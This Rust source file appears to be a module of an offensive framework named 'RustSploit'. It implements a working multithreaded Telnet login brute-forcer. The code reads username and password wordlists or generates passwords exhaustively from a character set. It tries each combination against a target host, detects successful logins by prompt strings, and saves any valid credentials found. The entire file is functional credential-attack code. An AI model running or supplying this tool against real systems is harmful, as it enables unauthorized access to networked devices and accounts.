use anyhow::{anyhow, Context, Result};
use async_stream::stream;
use colored::*;
use futures::{Stream, StreamExt};
use regex::Regex;
use std::net::ToSocketAddrs;
use std::path::Path;
use std::sync::{
    atomic::{AtomicBool, AtomicUsize, Ordering},
    Arc,
};
use std::time::Duration;
use tokio::fs::File;
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::sync::{mpsc, Mutex};
use tokio::time::timeout;
use futures::pin_mut;

/// Entry point (async)
pub async fn run(target: &str) -> Result<()> {
    println!("\n=== Telnet Bruteforce Module (RustSploit) ===\n");

    let target = target.trim().to_string();
    let port = prompt_port(23);
    let username_wordlist = prompt_wordlist("Username wordlist file: ")?;
    let raw_bruteforce = prompt_yes_no("Enable raw brute-force password generation? (y/n): ", false);
    let password_wordlist = if raw_bruteforce {
        prompt_optional_wordlist("Password wordlist file (leave blank to skip): ")?
    } else {
        Some(prompt_wordlist("Password wordlist file: ")?)
    };
    let (raw_charset, raw_max_length) = if raw_bruteforce {
        let charset = prompt_charset(
            "Raw brute-force character set (default a-zA-Z0-9...): ",
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:'\",.<>?/\\",
        );
        let max_len = prompt_max_length(4, 1, 6);
        (charset, max_len)
    } else {
        (String::new(), 0)
    };
    let threads = prompt_threads(8);
    let stop_on_success = prompt_yes_no("Stop on first valid login? (y/n): ", false);
    let full_combo = prompt_yes_no("Try every username with every password? (y/n): ", false);
    let verbose = prompt_yes_no("Verbose mode? (y/n): ", false);

    let config = TelnetBruteforceConfig {
        target,
        port,
        username_wordlist,
        password_wordlist,
        threads,
        stop_on_success,
        verbose,
        full_combo,
        raw_bruteforce,
        raw_charset,
        raw_max_length,
    };

    run_telnet_bruteforce(config).await
}

#[derive(Clone)]
struct TelnetBruteforceConfig {
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: Option<String>,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    raw_bruteforce: bool,
    raw_charset: String,
    raw_max_length: usize,
}

async fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
    // Normalize & validate host:port
    let addr = normalize_target(&config.target, config.port).context("Invalid target address")?;
    let socket_addr = addr
        .to_socket_addrs()?
        .next()
        .context("Unable to resolve target address")?;

    println!("\n[*] Starting Telnet bruteforce on {}", socket_addr);

    // Count lines (non-empty)
    let username_count = count_nonempty_lines(&config.username_wordlist).await?;
    if username_count == 0 {
        return Err(anyhow!("Username wordlist '{}' is empty", config.username_wordlist));
    }

    let password_count = if let Some(ref pwd_path) = config.password_wordlist {
        let c = count_nonempty_lines(pwd_path).await?;
        if c == 0 && !config.raw_bruteforce {
            return Err(anyhow!("Password wordlist '{}' is empty", pwd_path));
        }
        c
    } else {
        0
    };

    if !config.raw_bruteforce && password_count == 0 {
        return Err(anyhow!(
            "No passwords available (wordlist empty and raw brute-force disabled)"
        ));
    }
    if config.raw_bruteforce && config.raw_charset.is_empty() {
        return Err(anyhow!("Raw brute-force enabled but character set is empty"));
    }
    if config.raw_bruteforce && config.raw_max_length == 0 {
        return Err(anyhow!("Raw brute-force enabled but max length is zero"));
    }

    let creds = Arc::new(Mutex::new(Vec::new()));
    let stop_flag = Arc::new(AtomicBool::new(false));
    let attempt_counter = Arc::new(AtomicUsize::new(0));

    println!(
        "[*] Username file '{}' → {} username(s).",
        config.username_wordlist, username_count
    );
    if password_count > 0 {
        println!(
            "[*] Password file {:?} → {} password(s).",
            config.password_wordlist, password_count
        );
    }

    // bounded channel for backpressure: capacity = threads * 4
    let (tx, rx) = mpsc::channel::<(String, String)>(config.threads.saturating_mul(4).max(8));

    // Spawn producer: either enqueue combos (streaming) or produce raw stream
    let producer_stop = stop_flag.clone();
    let producer_counter = attempt_counter.clone();
    let username_path_clone = config.username_wordlist.clone();
    if password_count > 0 {
        // spawn a background task to stream combos
        let password_path = config.password_wordlist.clone().unwrap();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        tokio::spawn(async move {
            if let Err(e) = enqueue_wordlist_combos_stream_async(
                tx_clone,
                &username_path_clone,
                &password_path,
                full_combo,
                producer_counter,
                producer_stop,
                username_count,
                password_count,
            )
            .await
            {
                eprintln!("[!] Producer error: {}", e);
            }
        });
    }

    // If raw brute enabled, create an async password stream and spawn a task that consumes it and sends into channel.
    if config.raw_bruteforce {
        let charset: Vec<char> = config.raw_charset.chars().collect();
        let max_len = config.raw_max_length;
        let username_path = config.username_wordlist.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        let counter_clone = attempt_counter.clone();
        tokio::spawn(async move {
            let pwd_stream = raw_password_stream(charset, max_len);
            pin_mut!(pwd_stream); 
            while let Some(pwd) = pwd_stream.next().await {
                if stop_clone.load(Ordering::Relaxed) {
                    break;
                }
                // for that generated password, send to username(s) similar to previous logic:
                if full_combo || username_count == 1 {
                    if let Err(e) = send_password_to_all_usernames_async(
                        &username_path,
                        &pwd,
                        &tx_clone,
                        &stop_clone,
                        &counter_clone,
                    )
                    .await
                    {
                        eprintln!("[!] Error sending password combos: {}", e);
                        break;
                    }
                } else {
                    // multiple usernames but full_combo=false => first username only
                    if let Ok(Some(first_user)) = get_first_nonempty_line_async(&username_path).await {
                        if stop_clone.load(Ordering::Relaxed) {
                            break;
                        }
                        if tx_clone.send((first_user.clone(), pwd.clone())).await.is_err() {
                            break;
                        }
                        counter_clone.fetch_add(1, Ordering::Relaxed);
                    }
                }
            }
        });
    }

    // Drop extra tx to allow channel to close when producers finish
    drop(tx);

    // Spawn async workers - FIX: Use Arc<Mutex<Receiver>> to share receiver
    let rx = Arc::new(Mutex::new(rx));
    let mut worker_handles = Vec::new();
    
    for _ in 0..config.threads {
        let rx_clone = rx.clone();
        let addr_clone = addr.clone();
        let stop_clone = stop_flag.clone();
        let creds_clone = creds.clone();
        let cfg = config.clone();
        let attempt_counter_worker = attempt_counter.clone();

        let h = tokio::spawn(async move {
            loop {
                let pair = {
                    let mut guard = rx_clone.lock().await;
                    guard.recv().await
                };
                
                let Some((user, pass)) = pair else {
                    break; // Channel closed
                };

                if stop_clone.load(Ordering::Relaxed) {
                    break;
                }
                
                if cfg.verbose {
                    println!(
                        "{}",
                        format!("[*] Trying {}:{}", user, (&pass)).bright_blue()
                    );
                }

                attempt_counter_worker.fetch_add(1, Ordering::Relaxed);
                match try_telnet_login_async(&addr_clone, &user, &pass).await {
                    Ok(true) => {
                        println!(
                            "{}",
                            format!("[+] Valid: {}:{}", user, pass).green().bold()
                        );
                        creds_clone.lock().await.push((user.clone(), pass.clone()));
                        if cfg.stop_on_success {
                            stop_clone.store(true, Ordering::Relaxed);
                            break;
                        }
                    }
                    Ok(false) => {
                        if cfg.verbose {
                            println!("{}", format!("[-] Failed: {}:{}", user, pass).red());
                        }
                    }
                    Err(e) => {
                        if cfg.verbose {
                            eprintln!("{}", format!("[!] Error {}: {}:{}", e, user, pass).yellow());
                        }
                    }
                }
            }
        });
        worker_handles.push(h);
    }

    // Wait for all workers to finish
    for h in worker_handles {
        let _ = h.await;
    }

    println!(
        "[*] Total credential attempts queued: {}",
        attempt_counter.load(Ordering::Relaxed)
    );

    // Report & optional save
    let found = creds.lock().await;
    if found.is_empty() {
        println!("[-] No valid credentials found.");
    } else {
        println!("\n[+] Found credentials:");
        for (u, p) in found.iter() {
            println!(" - {}:{}", u, p);
        }
        if prompt("\n[?] Save to file? (y/n): ").trim().eq_ignore_ascii_case("y") {
            let file = prompt("Filename: ");
            if let Err(e) = save_results(&file, &found).await {
                eprintln!("[!] Failed to save: {}", e);
            } else {
                println!("[+] Results saved to '{}'", file);
            }
        }
    }

    Ok(())
}

/// Non-blocking async telnet-like attempt using tokio TcpStream + timeouts.
async fn try_telnet_login_async(addr: &str, username: &str, password: &str) -> Result<bool> {
    let socket = addr
        .to_socket_addrs()?
        .next()
        .ok_or_else(|| anyhow::anyhow!("Could not resolve address"))?;

    let connect_fut = TcpStream::connect(socket);
    let stream = timeout(Duration::from_millis(1500), connect_fut)
        .await
        .context("Connection timed out")?
        .context("Connect failed")?;
    let (mut reader, mut writer) = stream.into_split();
    let mut buf = vec![0u8; 1024];

    let mut login_seen = false;
    let mut pass_seen = false;

    for _ in 0..10 {
        let n = match timeout(Duration::from_millis(700), reader.read(&mut buf)).await {
            Ok(Ok(0)) | Ok(Err(_)) | Err(_) => {
                break;
            }
            Ok(Ok(n)) => n,
        };
        let out = String::from_utf8_lossy(&buf[..n]).to_lowercase();

        if !login_seen && (out.contains("login:") || out.contains("username")) {
            let _ = timeout(Duration::from_millis(700), writer.write_all(format!("{}\n", username).as_bytes())).await;
            login_seen = true;
            continue;
        }

        if login_seen && !pass_seen && out.contains("password") {
            let _ = timeout(Duration::from_millis(700), writer.write_all(format!("{}\n", password).as_bytes())).await;
            pass_seen = true;
            continue;
        }

        if pass_seen {
            if out.contains("incorrect") || out.contains("failed") || out.contains("denied") {
                return Ok(false);
            }
            if out.contains("last login") || out.contains('$') || out.contains('#') || out.contains("welcome") {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

/// Async raw password stream using `async_stream::stream!` - yields String passwords with backpressure.
fn raw_password_stream(charset: Vec<char>, max_len: usize) -> impl Stream<Item = String> {
    stream! {
        if charset.is_empty() || max_len == 0 {
            return;
        }
        
        let base = charset.len();
        
        for len in 1..=max_len {
            let mut indices = vec![0usize; len];
            
            loop {
                // Build password from current indices
                let pwd: String = indices.iter().map(|&i| charset[i]).collect();
                yield pwd;

                // Increment indices like odometer (rightmost first)
                let mut carry = true;
                for i in (0..len).rev() {
                    if carry {
                        indices[i] += 1;
                        if indices[i] < base {
                            carry = false;
                        } else {
                            indices[i] = 0;
                        }
                    }
                }
                
                // If we still have carry, we've exhausted all combinations for this length
                if carry {
                    break;
                }
            }
        }
    }
}

/// Async helper: send a generated password to every username by streaming the username file.
async fn send_password_to_all_usernames_async(
    username_path: &str,
    password: &str,
    tx: &mpsc::Sender<(String, String)>,
    stop_flag: &AtomicBool,
    counter: &AtomicUsize,
) -> Result<()> {
    if stop_flag.load(Ordering::Relaxed) {
        return Ok(());
    }
    let f = File::open(username_path).await.context("Unable to open username file")?;
    let mut reader = BufReader::new(f).lines();
    while let Some(line) = reader.next_line().await? {
        if stop_flag.load(Ordering::Relaxed) {
            break;
        }
        let u = line.trim().to_string();
        if u.is_empty() {
            continue;
        }
        tx.send((u.clone(), password.to_string())).await.map_err(|_| anyhow!("Receiver dropped"))?;
        counter.fetch_add(1, Ordering::Relaxed);
    }
    Ok(())
}

/// Async streamed combo enqueue (non-blocking file reads)
async fn enqueue_wordlist_combos_stream_async(
    tx: mpsc::Sender<(String, String)>,
    username_path: &str,
    password_path: &str,
    full_combo: bool,
    counter: Arc<AtomicUsize>,
    stop_flag: Arc<AtomicBool>,
    username_count: usize,
    password_count: usize,
) -> Result<()> {
    if password_count == 0 {
        return Ok(());
    }

    if full_combo {
        let ufile = File::open(username_path).await.context("Unable to open username file")?;
        let mut ureader = BufReader::new(ufile).lines();
        while let Some(uline) = ureader.next_line().await? {
            if stop_flag.load(Ordering::Relaxed) { break; }
            let u = uline.trim().to_string();
            if u.is_empty() { continue; }

            let pfile = File::open(password_path).await.context("Unable to open password file")?;
            let mut preader = BufReader::new(pfile).lines();
            while let Some(pline) = preader.next_line().await? {
                if stop_flag.load(Ordering::Relaxed) { break; }
                let p = pline.trim().to_string();
                if p.is_empty() { continue; }
                tx.send((u.clone(), p.clone())).await.map_err(|_| anyhow!("Receiver dropped"))?;
                counter.fetch_add(1, Ordering::Relaxed);
            }
        }
    } else if username_count == 1 {
        let first_user = get_first_nonempty_line_async(username_path).await?.ok_or_else(|| anyhow!("No username found"))?;
        let pfile = File::open(password_path).await.context("Unable to open password file")?;
        let mut preader = BufReader::new(pfile).lines();
        while let Some(pline) = preader.next_line().await? {
            if stop_flag.load(Ordering::Relaxed) { break; }
            let p = pline.trim().to_string();
            if p.is_empty() { continue; }
            tx.send((first_user.clone(), p.clone())).await.map_err(|_| anyhow!("Receiver dropped"))?;
            counter.fetch_add(1, Ordering::Relaxed);
        }
    } else if password_count == 1 {
        let first_pass = get_first_nonempty_line_async(password_path).await?.ok_or_else(|| anyhow!("No password found"))?;
        let ufile = File::open(username_path).await.context("Unable to open username file")?;
        let mut ureader = BufReader::new(ufile).lines();
        while let Some(uline) = ureader.next_line().await? {
            if stop_flag.load(Ordering::Relaxed) { break; }
            let u = uline.trim().to_string();
            if u.is_empty() { continue; }
            tx.send((u.clone(), first_pass.clone())).await.map_err(|_| anyhow!("Receiver dropped"))?;
            counter.fetch_add(1, Ordering::Relaxed);
        }
    } else {
        println!("[!] Multiple creds & full_combo=OFF → using first username.");
        let first_user = get_first_nonempty_line_async(username_path).await?.ok_or_else(|| anyhow!("No username found"))?;
        let pfile = File::open(password_path).await.context("Unable to open password file")?;
        let mut preader = BufReader::new(pfile).lines();
        while let Some(pline) = preader.next_line().await? {
            if stop_flag.load(Ordering::Relaxed) { break; }
            let p = pline.trim().to_string();
            if p.is_empty() { continue; }
            tx.send((first_user.clone(), p.clone())).await.map_err(|_| anyhow!("Receiver dropped"))?;
            counter.fetch_add(1, Ordering::Relaxed);
        }
    }

    Ok(())
}

/// Async helper to get first non-empty line from file
async fn get_first_nonempty_line_async(path: &str) -> Result<Option<String>> {
    let f = File::open(path).await.context(format!("Unable to open {}", path))?;
    let mut reader = BufReader::new(f).lines();
    while let Some(line) = reader.next_line().await? {
        let t = line.trim().to_string();
        if !t.is_empty() { return Ok(Some(t)); }
    }
    Ok(None)
}

/// Async count non-empty lines
async fn count_nonempty_lines(path: &str) -> Result<usize> {
    let f = File::open(path).await.context(format!("Unable to open {}", path))?;
    let mut reader = BufReader::new(f).lines();
    let mut count = 0usize;
    while let Some(line) = reader.next_line().await? {
        if !line.trim().is_empty() {
            count += 1;
        }
    }
    Ok(count)
}

/// Save results (now async)
async fn save_results(path: &str, creds: &[(String, String)]) -> Result<()> {
    use tokio::io::AsyncWriteExt;
    let mut f = File::create(path).await?;
    for (u, p) in creds {
        f.write_all(format!("{}:{}\n", u, p).as_bytes()).await?;
    }
    f.flush().await?;
    Ok(())
}

/// Prompt helpers (synchronous)
fn prompt(msg: &str) -> String {
    use std::io::Write;
    print!("{}", msg);
    let _ = std::io::stdout().flush();
    let mut buf = String::new();
    match std::io::stdin().read_line(&mut buf) {
        Ok(_) => buf.trim().to_string(),
        Err(_) => String::new(),
    }
}

fn prompt_port(default: u16) -> u16 {
    loop {
        let input = prompt("Port (default 23): ");
        if input.is_empty() { return default; }
        match input.parse::<u16>() {
            Ok(port) if port > 0 => return port,
            _ => println!("[!] Invalid port value."),
        }
    }
}

fn prompt_threads(default: usize) -> usize {
    loop {
        let input = prompt("Number of threads (default 8): ");
        if input.is_empty() { return default.max(1); }
        match input.parse::<usize>() {
            Ok(val) if val >= 1 && val <= 256 => return val,
            _ => println!("[!] Invalid thread count."),
        }
    }
}

fn prompt_yes_no(message: &str, default: bool) -> bool {
    loop {
        let input = prompt(message);
        if input.is_empty() { return default; }
        match input.to_lowercase().as_str() {
            "y"|"yes" => return true,
            "n"|"no" => return false,
            _ => println!("[!] Please respond with y or n."),
        }
    }
}

fn prompt_wordlist(prompt_text: &str) -> Result<String> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() { println!("[!] Path cannot be empty."); continue; }
        let trimmed = path.trim();
        let candidate = Path::new(trimmed);
        if candidate.is_file() {
            return Ok(trimmed.to_string());
        } else {
            println!("[!] File '{}' does not exist or is not a regular file.", trimmed);
        }
    }
}

fn prompt_optional_wordlist(prompt_text: &str) -> Result<Option<String>> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() { return Ok(None); }
        let trimmed = path.trim();
        let candidate = Path::new(trimmed);
        if candidate.is_file() { return Ok(Some(trimmed.to_string())); }
        else { println!("[!] File '{}' does not exist or is not a regular file.", trimmed); }
    }
}

fn prompt_charset(prompt_text: &str, default: &str) -> String {
    let input = prompt(prompt_text);
    if input.is_empty() { default.to_string() } else { input.trim().to_string() }
}

fn prompt_max_length(default: usize, _min: usize, max: usize) -> usize {
    loop {
        let input = prompt(&format!("Maximum password length (1-{}, default {}): ", max, default));
        if input.is_empty() { return default; }
        match input.parse::<usize>() {
            Ok(val) if val >= 1 && val <= max => return val,
            _ => println!("[!] Invalid length."),
        }
    }
}

fn normalize_target(host: &str, default_port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$").unwrap();
    let caps = re.captures(host.trim()).ok_or_else(|| anyhow::anyhow!("Invalid target format: {}", host))?;
    let addr = caps.name("addr").unwrap().as_str();
    let port = if let Some(m) = caps.name("port") {
        m.as_str().parse::<u16>().context("Invalid port value")?
    } else { default_port };
    let formatted = if addr.contains(':') && !addr.contains('.') { format!("[{}]:{}", addr, port) } else { format!("{}:{}", addr, port) };
    formatted.to_socket_addrs().context(format!("Could not resolve {}", formatted))?;
    Ok(formatted)
}
